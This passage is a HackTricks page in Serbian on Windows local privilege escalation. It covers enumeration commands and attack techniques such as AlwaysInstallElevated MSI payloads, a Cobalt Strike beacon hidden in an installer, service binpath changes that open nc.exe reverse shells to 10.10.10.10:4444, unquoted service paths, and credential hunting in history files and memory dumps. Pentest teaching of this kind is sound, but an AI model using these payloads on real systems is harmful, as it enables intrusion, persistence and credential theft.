# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje Windows local privilege escalation vektora:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Početna teorija za Windows

### Pristupni tokeni

**Ako ne znate šta su Windows pristupni tokeni, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Pogledajte sledeću stranicu za više informacija o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windowsu, trebalo bi da pročitate sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows sigurnosne kontrole

Postoje različite stvari u Windowsu koje mogu **sprečiti vas od enumeracije sistema**, pokretanje izvršnih fajlova ili čak **otkriti vaše aktivnosti**. Trebalo bi da **pročitate** sledeću **stranicu** i **izenumerišete** sve ove **mehanizme** **odbrane** pre nego što započnete privilege escalation enumeraciju:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li Windows verzija ima neku poznatu ranjivost (proverite i primenjene zakrpe).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretraživanje detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza sadrži više od 4.700 bezbednosnih ranjivosti, pokazujući **ogromnu površinu napada** koju predstavlja Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_

**Lokalno sa informacijama o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repos sa exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Ima li nekih credential/Juicy info sačuvanih u env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Istorija PowerShell-a
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript fajlovi

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Detalji izvršavanja PowerShell pipeline-a se beleže, obuhvatajući izvršene komande, pozive komandi i delove skripti. Međutim, potpuni detalji izvršavanja i rezultati izlaza možda neće biti zabeleženi.

Da biste ovo omogućili, sledite uputstva u odeljku "Transcript files" dokumentacije, birajući **"Module Logging"** umesto **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Da biste prikazali poslednjih 15 događaja iz PowersShell logova, možete izvršiti:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Kompletan zapis aktivnosti i pun sadržaj izvršavanja skripte se beleže, čime se osigurava da je svaki blok koda dokumentovan dok se izvršava. Ovaj proces čuva sveobuhvatan revizijski zapis svake aktivnosti, koristan za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja obezbeđuju se detaljni uvidi u proces.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Logovanje događaja za Script Block može se pronaći u Windows Event Viewer na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste videli poslednjih 20 događaja možete koristiti:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet podešavanja
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Pogoni
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Možete kompromitovati sistem ako se ažuriranja ne zahtevaju preko http**S**, već preko http.

Počinjete proverom da li mreža koristi non-SSL WSUS update tako što ćete pokrenuti sledeće u cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ili sledeće u PowerShell-u:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ako dobijete odgovor kao jedan od ovih:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
A ako `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ima vrednost jednaku `1`.

Onda, **it is exploitable.** Ako poslednji registry ima vrednost 0, entry za WSUS će biti ignorisan.

Da biste iskoristili ovu ranjivost možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ovo su MiTM weaponized exploit skripte za ubacivanje 'fake' ažuriranja u non-SSL WSUS saobraćaj.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
U suštini, ovo je propust koji ovaj bug koristi:

> Ako imamo mogućnost da izmenimo proxy za našeg lokalnog korisnika, i Windows Updates koristi proxy konfigurisan u Internet Explorer’s settings, onda imamo mogućnost da lokalno pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus) da presretnemo sopstveni saobraćaj i pokrenemo kod kao povišeni korisnik na našem asset-u.
>
> Štaviše, pošto WSUS servis koristi podešavanja trenutnog korisnika, on će takođe koristiti i njegovu prodavnicu sertifikata. Ako generišemo self-signed sertifikat za WSUS hostname i dodamo taj sertifikat u certificate store trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi HSTS-like mehanizme za implementaciju trust-on-first-use tip validacije sertifikata. Ako je sertifikat koji je predstavljen poverljiv korisniku i ima ispravan hostname, biće prihvaćen od strane servisa.

Možete iskoristiti ovu ranjivost koristeći alat [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kad bude oslobođen).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Mnogi enterprise agenti izlažu localhost IPC površinu i privilegovani update kanal. Ako se enrollment može primorati na napadački server i updater veruje rogue root CA ili ima slabe provere potpisivača, lokalni korisnik može dostaviti maliciozni MSI koji će SYSTEM servis instalirati. Pogledajte generalizovanu tehniku (zasnovanu na Netskope stAgentSvc chain – CVE-2025-0309) ovde:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Postoji **local privilege escalation** ranjivost u Windows **domain** okruženjima pod određenim uslovima. Ti uslovi uključuju okruženja gde **LDAP signing nije enforced,** korisnici imaju prava koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD),** i mogućnost za korisnike da kreiraju računare u domenu. Važno je napomenuti da se ovi **zahtevi** ispunjavaju korišćenjem **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** ove 2 registry vrednosti su **enabled** (vrednost je **0x1**), tada korisnici bilo kog privilegija mogu **install** (execute) `*.msi` fajlove kao NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ako imate meterpreter sesiju, možete automatizovati ovu tehniku koristeći modul **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up da kreirate u trenutnom direktorijumu Windows MSI binarni fajl za eskalaciju privilegija. Ovaj skript ispisuje prekompajlirani MSI installer koji traži dodavanje korisnika/grupe (tako da će vam biti potreban GIU pristup):
```
Write-UserAddMSI
```
Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj tutorijal da naučite kako napraviti MSI wrapper koristeći ove alate. Imajte na umu da možete umotati **.bat** fajl ako **samo** želite **izvršavati** **komandne linije**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generišite** pomoću Cobalt Strike ili Metasploit novi **Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i u polje za pretragu otkucajte "installer". Izaberite projekat **Setup Wizard** i kliknite **Next**.
- Dajte projektu ime, npr. **AlwaysPrivesc**, koristite **`C:\privesc`** za lokaciju, označite **place solution and project in the same directory**, i kliknite **Create**.
- Nastavite klikati **Next** dok ne stignete do koraka 3 od 4 (choose files to include). Kliknite **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite **Finish**.
- Istaknite projekat **AlwaysPrivesc** u **Solution Explorer** i u **Properties**, promenite **TargetPlatform** sa **x86** na **x64**.
- Postoje i druga svojstva koja možete promeniti, kao što su **Author** i **Manufacturer**, što može učiniti instaliranu aplikaciju legitimnijom.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite vaš fajl **beacon.exe** i kliknite **OK**. Ovo će obezbediti da se beacon payload izvrši čim se pokrene installer.
- U okviru **Custom Action Properties**, promenite **Run64Bit** u **True**.
- Na kraju, **build it**.
- Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste postavili platformu na x64.

### MSI Installation

Da izvršite **instalaciju** malicioznog `.msi` fajla u **pozadini:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Da biste iskoristili ovu ranjivost možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Podešavanja audita

Ova podešavanja odlučuju šta se **beleži**, zato treba da obratite pažnju
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, zanimljivo je znati gde se šalju logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** je dizajniran za **upravljanje lokalnim Administrator lozinkama**, osiguravajući da je svaka lozinka **jedinstvena, nasumično generisana i redovno ažurirana** na računarima priključenim na domen. Ove lozinke su sigurno uskladištene u Active Directory i mogu im pristupiti samo korisnici kojima su putem ACLs dodeljena dovoljna ovlašćenja, omogućavajući im, ako su autorizovani, da vide lozinke lokalnog Administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo pojačanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubace kod, čime se dodatno osigurava sistem.\
[**Više informacija o LSA Protection ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti credentials sačuvane na uređaju od pretnji kao što su pass-the-hash napadi.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Keširani kredencijali

**Domain credentials** se autentifikuju od strane **Lokalnog bezbednosnog autoriteta** (LSA) i koriste ih komponente operativnog sistema. Kada su podaci za prijavu korisnika autentifikovani od strane registrovanog sigurnosnog paketa, obično se uspostavljaju domain credentials za korisnika.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Korisnici i grupe

### Nabrajanje korisnika i grupa

Treba da proverite da li neka od grupa kojima pripadate imaju zanimljive dozvole
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi možda ćete moći da eskalirate privilegije**. Saznajte o privilegovanim grupama i kako ih zloupotrebiti da biste eskalirali privilegije ovde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali o interesantnim tokenima** i kako ih zloupotrebiti:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije
```bash
qwinsta
klist sessions
```
### Kućni folderi
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politika lozinki
```bash
net accounts
```
### Dohvati sadržaj međuspremnika
```bash
powershell -command "Get-Clipboard"
```
## Pokrenuti procesi

### Dozvole fajlova i foldera

Prvo, prilikom listanja procesa **proverite da li se lozinke nalaze u komandnoj liniji procesa**.\
Proverite da li možete **prepisati neki pokrenuti binary** ili da li imate dozvole za pisanje u folderu binarnog fajla kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Uvek proverite da li su mogući [**electron/cef/chromium debuggers** pokrenuti — možete ih zloupotrebiti za eskalaciju privilegija](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Provera dozvola binaries procesa**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Provera dozvola foldera binarnih fajlova procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Izdvajanje lozinki iz memorije

Možete napraviti dump memorije pokrenutog procesa koristeći **procdump** iz sysinternals. Servisi poput FTP-a imaju **credentials in clear text in memory**, pokušajte da dump-ujete memoriju i pročitate credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Nezaštićene GUI aplikacije

**Aplikacije koje rade kao SYSTEM mogu dozvoliti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: "Windows Help and Support" (Windows + F1), potražite "command prompt", kliknite na "Click to open Command Prompt"

## Servisi

Dobijte listu servisa:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Dozvole

Možete koristiti **sc** da dobijete informacije o servisu.
```bash
sc qc <service_name>
```
Preporučuje se da imate binarni fajl **accesschk** iz _Sysinternals_ kako biste proverili potreban nivo privilegija za svaku uslugu.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Preporučuje se да проверите да ли "Authenticated Users" могу да измене било коју услугу:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako imate ovu grešku (na primer sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Servis ne može biti pokrenut, ili zato što je onemogućen ili zato što nema povezanih omogućених uređaja._

Možete ga omogućiti koristeći
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Imajte u vidu da servis upnphost zavisi od SSDPSRV da bi radio (za XP SP1)**

**Još jedno zaobilazno rešenje** ovog problema je pokretanje:
```
sc.exe config usosvc start= auto
```
### **Izmenite putanju izvršnog fajla servisa**

U scenariju u kome grupa "Authenticated users" poseduje **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršni binarni fajl servisa. Da biste izmenili i pokrenuli **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponovno pokretanje servisa
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegije se mogu eskalirati putem sledećih dozvola:

- **SERVICE_CHANGE_CONFIG**: Dozvoljava rekonfiguraciju binarnog fajla servisa.
- **WRITE_DAC**: Omogućava rekonfiguraciju dozvola, što dovodi do mogućnosti promene konfiguracije servisa.
- **WRITE_OWNER**: Dozvoljava preuzimanje vlasništva i rekonfiguraciju dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost izmene konfiguracije servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost izmene konfiguracije servisa.

Za detekciju i eksploataciju ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole binarnih fajlova servisa

**Proverite da li možete izmeniti binarni fajl koji servis izvršava** ili da li imate **write permissions na folderu** u kome se binarni fajl nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Možete dobiti sve binarne fajlove koje servis izvršava koristeći **wmic** (ne u system32) i proveriti svoje dozvole koristeći **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Takođe možete koristiti **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dozvole za izmene registra servisa

Treba da proverite da li možete izmeniti bilo koji registar servisa.\
Možete **proveriti** svoje **dozvole** nad registrom **servisa** tako što ćete:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** poseduju `FullControl` dozvole. Ako je tako, izvršni binarni fajl servisa može biti izmenjen.

Da biste promenili putanju izvršavanog binarnog fajla:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Dozvole AppendData/AddSubdirectory nad registry servisa

Ako imate ovu dozvolu nad registry-jem, to znači da **možete kreirati pod-registrije iz ove**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do izvršne datoteke nije u navodnicima, Windows će pokušati da izvrši svaku komponentu pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Prikažite sve putanje servisa bez navodnika, osim onih koje pripadaju ugrađenim Windows servisima:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Možete otkriti i iskoristiti** ovu ranjivost pomoću metasploit: `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati servisni binarni fajl pomoću metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Radnje oporavka

Windows omogućava korisnicima da odrede radnje koje će biti izvršene ako servis zakaže. Ova opcija se može konfigurisati da pokazuje na binarni fajl. Ako je taj binarni fajl zamenljiv, privilege escalation može biti moguć. Više detalja možete pronaći u [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole binarnih fajlova** (možda možete prepisati jedan i izvršiti privilege escalation) i **dozvole foldera** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Dozvole za pisanje

Proverite da li možete izmeniti neki config file kako biste pročitali neki poseban fajl, ili da li možete izmeniti neki binary koji će biti izvršen pod Administrator account (schedtasks).

Jedan način da pronađete slabe dozvole foldera/fajlova u sistemu je da uradite:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Pokretanje pri podizanju sistema

**Proverite da li možete da prepišete neki registry ili binary koji će biti izvršen od strane drugog korisnika.**\
**Pročitajte** **sledeću stranicu** da saznate više o zanimljivim **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **third party weird/vulnerable** drajvere
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ako drajver izlaže arbitrary kernel read/write primitive (uobičajeno u slabo dizajniranim IOCTL handler-ima), možete eskalirati tako što ćete ukrasti SYSTEM token direktno iz kernel memory. Pogledajte step‑by‑step tehniku ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Zloupotreba nedostatka FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + EDR kill)

Neki potpisani third‑party drajveri kreiraju svoj device object sa jakim SDDL preko IoCreateDeviceSecure ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ovog flag-a, secure DACL se ne primenjuje kada se device otvori putem path-a koji sadrži dodatnu komponentu, što omogućava bilo kom nepriviligovanom korisniku da dobije handle koristeći namespace path kao:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

